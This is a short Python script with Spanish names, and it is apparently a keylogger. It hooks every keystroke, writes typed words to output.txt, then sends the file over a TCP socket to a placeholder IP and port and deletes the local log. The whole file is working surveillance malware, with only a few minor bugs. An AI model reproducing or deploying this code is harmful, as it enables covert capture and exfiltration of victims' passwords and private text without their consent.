import keyboard
import sys
import socket
import os

palabra = ""


def pulsacion_tecla(pulsacion):

    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == "space" or pulsacion.name == "enter" or pulsacion.name == "tab":
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

keyboard.hook(pulsacion_tecla)

def guardar_palabra_al_espacio():
    with open("output.txt", "a") as file:

        file.write(palabra + "\n")
    print(f"Palabra registrada {palabra}")
    resetear_palabra()

def resetear_palabra():
    global palabra
    palabra = ""

def enviar_archivo_via_socket(archivo_a_enviar, direccion_ip_destino, puerto_destino):
    try:
        with open(archivo_a_enviar, "rb") as file:
            contenido = file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            conexion.connect((direccion_ip_destino, puerto_destino))
            conexion.sendall(contenido)
            os.remove("output.txt")
            sys.exit
    except Exception as e:
        print("Hubo un error en la conexion: ", e)

def detener_script():
    keyboard.unhook_all()
    enviar_archivo_via_socket(archivo_a_enviar, direccion_ip_destino, puerto_destino)

direccion_ip_destino = "ip"
puerto_destino = "puerto"
archivo_a_enviar = "output.txt"

try:
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    print("Script detenido")
    pass
